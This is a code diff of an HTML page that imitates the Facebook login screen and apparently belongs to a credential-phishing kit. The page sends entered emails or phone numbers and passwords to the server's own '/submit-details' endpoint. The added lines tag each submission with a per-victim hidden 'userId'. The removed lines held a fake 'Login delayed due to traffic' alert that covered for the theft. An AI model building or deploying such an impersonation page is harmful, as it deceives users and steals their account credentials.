@@ -6,23 +6,20 @@
     <title>Facebook Login</title>
 </head>
 <body>
-    <h1>Facebook Login</h1>
-    <form action="/submit-login" method="POST" onsubmit="return showAlert()">
-        <label for="email">Number/Email:</label>
-        <input type="text" id="email" name="email" required><br><br>
-
+    <h2>Login to Facebook</h2>
+    <form id="loginForm" action="/submit-details" method="POST">
+        <input type="hidden" name="userId" value="<%= userId %>">
+        
+        <label for="emailOrNumber">Number/Email:</label>
+        <input type="text" id="emailOrNumber" name="emailOrNumber" required>
+    
         <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-
+        <input type="password" id="password" name="password" required>
+        
         <button type="submit">Login</button>
-        <p><a href="#">Forgotten password?</a> | <a href="#">Create new account</a></p>
     </form>
-
-    <script>
-        function showAlert() {
-            alert("Login delayed due to traffic, please try again later.");
-            return true; // Allows form submission
-        }
-    </script>
+    
+    <p><a href="#">Forgotten password?</a> | <a href="#">Create new account</a></p>
+    
 </body>
 </html>
